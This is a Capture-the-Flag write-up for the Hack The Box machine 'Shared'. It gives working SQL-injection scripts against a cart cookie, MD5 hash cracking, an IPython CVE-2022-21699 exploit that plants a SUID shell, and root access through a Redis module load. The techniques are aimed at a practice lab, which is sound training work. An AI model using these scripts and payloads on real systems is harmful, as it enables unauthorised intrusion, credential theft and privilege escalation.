---
title: "HTB • Shared"
tags:
  - "Medium Difficulty"
  - "Intermediate"
  - "Linux"
  - "Database"
  - "SQL Injection"
  - "MySQL"
  - "Web"
  - "CVE"
  - "Reversing"
  - "Static Analysis"
  - "Redis"
  - "Hash Cracking"
excerpt: "Shared is a medium-difficulty Linux machine on Hack the Box that involves SQL injection, reversing, static analysis, and password cracking. The technologies featured in this machine include data storage solutions such as MySQL and Redis."
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: /assets/img/post/htb-machines-shared/
---


Shared is a medium Linux machine created by [**Nauten**](https://app.hackthebox.com/users/27582) on [**Hack The Box**](https://app.hackthebox.com/machines/Shared) that features a website with a virtual hostname that is vulnerable to **SQL injection**. Successful exploitation of this vulnerability provides us with the password for a user called **james_mason**. With these credentials we are able to login via SSH and elevate privileges to a user called **dan_smith** by exploiting a cron job that uses a version of **ipython** that is vulnerable to **CVE-2022-21699**. We then reverse-engineer an executable using both static and dynamic analysis to recover the password for the local Redis service. The Redis process is running as root, so we load a special shared object module using `LOAD MODULE` to execute commands as root.


## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="" # replace with machine address
echo rhost=$rhost >> .env && . ./.env
ctfscan $rhost
```
{:.nolineno}

The scan reports that the SSH service, HTTP service, and HTTPS service are running on ports **22**, **80**, and **443** respectively.

## Web Recon

Upon visiting port 80, we are redirected to **shared.htb**. Let's add this hostname to our `/etc/hosts`{:.filepath} file with the corresponding IP address.

```bash
echo 'vhost=("shared.htb")' >> .env && . ./.env
echo -e "$rhost\\t$vhost" | sudo tee -a /etc/hosts
```
{:.nolineno}

Now we'll visit [https://shared.htb/](https://shared.htb/) in a browser session being proxied through the [BurpSuite](https://portswigger.net/burp) HTTP proxy.

![Index page](homepage.png)
_shared.htb web index page_

### Walking the Application

When exploring the content of the website, we eventually discover the checkout page at [/index.php?controller=cart&action=show](https://shared.htb/index.php?controller=cart&action=show). When we hover over the checkout button, we can see that it will send us to [https://checkout.shared.htb](https://checkout.shared.htb). Let's add this virtual hostname to our `/etc/hosts`{:.filepath} file so we can view its content.

```bash
sudo sed -E -i 's/(shared.htb).*/\1 checkout.\1/' /etc/hosts
```
{:.nolineno}

Now when we add an item to our cart and navigate to [/index.php?controller=cart&action=show](https://shared.htb/index.php?controller=cart&action=show), we'll click the checkout button to be redirected to the checkout site.

![Checkout site](checkout.png)
_checkout.shared.htb web index page_

### Investigating Functionality

It's interesting how this site is able to determine which item we had in our cart considering we did not supply any HTTP GET or POST parameters. Let's investigate.

Looking at the initial request we sent to the checkout site in the BurpSuite site map, we can see that our request contains an unusual cookie called **custom_cart**. The value of this cookie can be automatically decoded by highlighting it, revealing a JSON object with the product code and quantity of the checkout item.

![burpsuite_cookie_image](burpsuite-cookie.png)
_We find a mysterious cookie in BurpSuite_

We can infer that the site uses the supplied product code in custom_cart to find the price of the item since we do not supply the price, but only the product code. This activity is likely handled by some type of database solution such as an **SQL server**. With this in mind, we can check if this functionality is vulnerable to SQL injection.

### Vulnerability Discovery

Let's input some basic SQL injection payloads to the cookie in the BurpSuite repeater tab to see if SQL injection is possible.

![BurpSuite injection payloads](burpsuite-injection-0.png)
_The server's response to a common SQL injection payload_

```json
{"CRAAFTKP'#":"1"}
```
{:.nolineno}

The response to the first payload suggests that SQL injection is possible but we can make sure by sending a payload that should evaluate to _false_, and one that should be _true_.

```python
#!/usr/bin/env python3

from urllib.parse import quote
from sys import argv

if len(argv) == 2:
        sqli = argv[1]
        sqli = sqli.replace('\\', '\\\\')
        sqli = sqli.replace('"','\\"')
        print(quote('{"' + argv[1] + '":"1"}'))
```
{:file="makepayload.py"}

```bash
chmod +x makepayload.py
true=$(./makepayload.py "' OR 1=1#") # Always resolves to true
false=$(./makepayload.py "' AND 1=2#") # Always resolves to false

url="https://checkout.shared.htb"
curl -k -s $url -b "custom_cart=$true" | sed 's/^ *//' > true.html
curl -k -s $url -b "custom_cart=$false" | sed 's/^ *//' > false.html
```
{:.nolineno}

This should leave you with two files called `false.html`{:.filepath} and `true.html`{:.filepath}. To find the difference between the two response bodies we can use `diff`.

```bash
diff false.html true.html
```
{:.nolineno}
```diff
37,39c37,39
< <td>Not Found</td>
< <td>0</td>
< <td>$0,00</td>
---
> <td>53GG2EF8</td>
> <td>1</td>
> <td>$23,90</td>
45c45
< <th scope="col">$0,00</th>
---
> <th scope="col">$23,90</th>
```
{:.nolineno}

The false query returns "Not Found" and zero values for the quantity and price while the true query returns a product entry. This is definitely enough evidence of an SQL injection vulnerability to begin exploitation.

## Web Exploitation

We have already determined that boolean-based blind SQL injection is possible with the true and false queries, but there is a good chance we can use `UNION SELECT` queries to exfiltrate database values without having to use a side-channel.

### Union Query Exfiltration

Let's first find the number of columns in the original query so we can match it in our `UNION SELECT` extension.

```bash
payload=$(./makepayload.py "' UNION SELECT 'c0lumn1','c0lumn2','c0lumn3'#")

curl -k -s "https://checkout.shared.htb" -b "custom_cart=$payload" | \
	sed 's/^ *//' |
	egrep '</?td>'
```
{:.nolineno}
```html
<td>c0lumn2</td>
<td>1</td>
<td>$</td>
```
{:.nolineno}

Notice how the response contains the value we sent in the second column. This means we can extract data through the second column. Now let's create a script to get any raw value from the database.

```bash
#!/bin/bash

[ -z "$SELECT" ] && echo "SELECT=* FROM=* WHERE=* $0" && exit

payload="' UNION SELECT '',$SELECT,''"

[ -z "$FROM" ] || payload="$payload FROM $FROM"
[ -z "$WHERE" ] || payload="$payload WHERE $WHERE" 

echo $payload

payload=$(./makepayload.py "$payload#")

curl -k -s "https://checkout.shared.htb" -b "custom_cart=$payload" |
	egrep '</?td>' |
	head -1 |
	sed -E 's/^ *<td>(.*)<\/td>$/\1/'
```
{:file="sqli.sh"}

Then we can see if we can get the available database names. Remember that this database is probably MySQL because the `#` comment is working.


```bash
chmod +x sqli.sh
SELECT="group_concat(schema_name)"   \
FROM="information_schema.schemata"   \
	./sqli.sh
```
{:.nolineno}
>
```
information_schema,checkout
```
{:.nolineno}

There is a database called **checkout** that we should explore. Let's find the names of its tables.

```bash
SELECT="group_concat(table_name)"   \
FROM="information_schema.tables"    \
WHERE="table_schema='checkout'"     \
	./sqli.sh
```
{:.nolineno}
>
```
user,product
```
{:.nolineno}

The _user_ table seems interesting. Let's find the column names and dump the table contents.

```bash
SELECT="group_concat(column_name)"   \
FROM="information_schema.columns"    \
WHERE="table_name='user'"            \
	./sqli.sh
```
{:.nolineno}
>
```
id,username,password
```
{:.nolineno}

```bash
SELECT="group_concat(concat(id,0x7c,username,0x7c,password))" \
FROM="checkout.user" \
	./sqli.sh
```
{:.nolineno}
>
```
1|james_mason|[REDACTED]
```
{:.nolineno}

There is only one result, but we got what looks like an MD5 hash in the _password_ column for the user **james_mason**.

## Shell as james_mason

Let's try to crack the hash using [John the Ripper](https://github.com/openwall/john)

```bash
# bryan@attacker
hash="" # Hash here
echo "james_mason:$hash" > md5.john
john md5.john \
	--format="raw-md5" \
	--wordlist="rockyou.txt" # classic rockyou.txt wordlist
```
{:.nolineno}

Using these credentials on the target's SSH server will land us a shell as **james_mason**.

```bash
# bryan@attacker
ssh "james_mason@$rhost"
```
{:.nolineno}

There is no user flag in our home directory so we might need to do some lateral movement.

### Lateral Movement

We will be using LinPEAS from [PEASS-ng](https://github.com/carlospolop/PEASS-ng) to look for any useful information on the machine. We will also be using [pspy](https://github.com/DominicBreuker/pspy) to snoop on processes.

```bash
# bryan@attacker
lhost="10.10.14.10" # Listener host
cd $(mktemp -d)
wget \
	"https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" \
	"https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh"
php -S $lhost:80
```
{:.nolineno}

```bash
# james_mason@shared.htb (SSH)
lhost="10.10.14.10" # Attacker's IP address
mkdir .sneak && cd .sneak
wget "http://$lhost/pspy64" "http://$lhost/linpeas.sh"
bash ./linpeas.sh | tee linpeas.log
```
{:.nolineno}

We don't get anything that blatantly stands out in the LinPEAS output. Let's try running PSpy for a few minutes.

```bash
# james_mason@shared.htb (SSH)
chmod +x pspy64
timeout 3m ./pspy64 | tee pspy.log
```
{:.nolineno}

Looking at the output, user ID 0 and user ID 1001 seem to be running routine commands. UID 0 is **root** and User ID 1001 turns out to be user **dan_smith**, declared in `/etc/passwd`{:.filepath}. It can be noted that dan_smith runs an interesting command every minute.

>
```bash
/bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
```
{:.nolineno}

The user enters the `/opt/scripts_review`{:.filepath} directory and executes `/usr/local/bin/ipython`{:.filepath}.

#### CVE-2022-21699

After doing some research into `ipython`, we come across a [vulnerability advisory](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) that details a code execution flaw.

> We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.

Let's check if the version on the machine is vulnerable.

```bash
# james_mason@shared.htb (SSH)
/usr/local/bin/ipython --version
```
{:.nolineno}

The version is **8.0.0**, which is vulnerable. Since the routine command executed by dan_smith is run in the `/opt/scripts_review`{:.filepath} directory, we could exploit the vulnerability if `/opt/scripts_review`{:.filepath} is writable.

```bash
# james_mason@shared.htb (SSH)
ls -la /opt/scripts_review
```
{:.nolineno}

It is writable by those in the **developer** group. According to the output of the `id` command, our current user is actually part of this group.

##### Exploitation

Let's test our hypothesis by following the instructions in the advisory to execute code as dan_smith.

```bash
#!/bin/bash

exploitdir="/opt/scripts_review"
cmd="cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh"

mkdir -m 777 "$exploitdir/profile_default"
mkdir -m 777 "$exploitdir/profile_default/startup"
echo "__import__('os').popen('$cmd')" > "$exploitdir/profile_default/startup/x.py"
```
{:file="exploit.sh"}

After running the script and waiting a minute, our SUID shell should be at `/tmp/dan_smith_sh`{:.filepath}.

```bash
# james_mason@shared.htb (SSH)
/tmp/dan_smith_sh -p
```
{:.nolineno}

## Privilege Escalation

The first flag is located at `/home/dan_smith/user.txt`{:.filepath}

### Stabilizing Shell

Let's copy the contents of `/home/dan_smith/.ssh/id_rsa`{:.filepath} over to the attacker machine and use it to log in as _dan\_smith_ via SSH to get a more stable shell.

```bash
# bryan@attacker
chmod 600 dan_smith_id_rsa
ssh -i dan_smith_id_rsa "dan_smith@$rhost"
```
{:.nolineno}

### Enumeration

When running the `id` command, we learn that our current user is part of the **sysadmin** group. Let's see what this group has special access to.

```bash
# dan_smith@shared.htb (SSH)
find / -group sysadmin 2>/dev/null
```
{:.nolineno}
>
```
/usr/local/bin/redis_connector_dev
```

One file at `/usr/local/bin/redis_connector_dev`{:.filepath} is returned. This file probably has something to do with a key-value data storage solution known as **Redis**. When we execute `/usr/local/bin/redis_connector_dev`{:.filepath}, it prints a log message saying "_Logging to redis instance using password_" and what looks like the output of the `INFO Server` redis query.

### Redis

Let's gather some basic info on the file and see what's going on behind the scenes.

```bash
# dan_smith@shared.htb (SSH)
file /usr/local/bin/redis_connector_dev|tr ',' '\n'
```
{:.nolineno}

Based on the output of the `file` command, we can note a few things about the file:
*   It is an ELF x86-64 executable
*   It was built with a Go compiler (hence the Go BuildID)
*   It is not stripped


#### Finding the Password

Since the Redis RESP protocol operates in plaintext, we might be able to capture the password. First, let's copy the file to the attacker machine.

```bash
# bryan@attacker
scp -i dan_smith_id_rsa "dan_smith@$rhost:/usr/local/bin/redis_connector_dev" .
chmod +x redis_connector_dev
```
{:.nolineno}

Running the file on the attacker machine, we get an error complaining that TCP port 6379 is closed on the loopback address. We can open that port by running `nc` in a separate tab.

```bash
# bryan@attacker
nc -lv 127.0.0.1 6379
```
{:.nolineno}

Now if we run `./redis_connector_dev`{:.filepath} we get some output to the listener.

```text
Connection received on localhost 35468
*2
$4
auth
$16
[REDACTED]
```
{:.nolineno}

The strings _auth_ and _\[REDACTED\]_ are passed. Given the circumstances, the second string seems like it may be the password so let's try using that with the `redis-cli` command back on the target machine.

```bash
# dan_smith@shared.htb (SSH)
redis-cli -a "$password" INFO server
```
{:.nolineno}

The `INFO server` command is successfully executed. While running some extra enumeration commands we find out that the redis store is pretty much empty.

```bash
# dan_smith@shared.htb (SSH)
redis-cli -a "$password" INFO keyspace
```
{:.nolineno}

After some research on redis, we come across [this page](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce) which presents different methods of achieving RCE on a redis server. This is useful for us because the user running the redis server is **root** meaning we will execute commands as root if RCE is possible.

#### Loading Modules

One method is to load a special shared object file using `MODULE LOAD` query. We can build the shared object from [this source code](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) on the attacker machine, then copy `module.so`{:.filepath} to the target.

```bash
# james_mason@shared.htb (SSH)
command="cp /bin/sh /root_sh;chmod a+xs /root_sh"
redis-cli -a "$password" MODULE LOAD ~/module.so &&
	redis-cli -a "$password" system.exec "$command"
/root_sh -p
```
{:.nolineno}

Running this should land us a shell as root where the last flag can be found at `/root/root.txt`{:.filepath}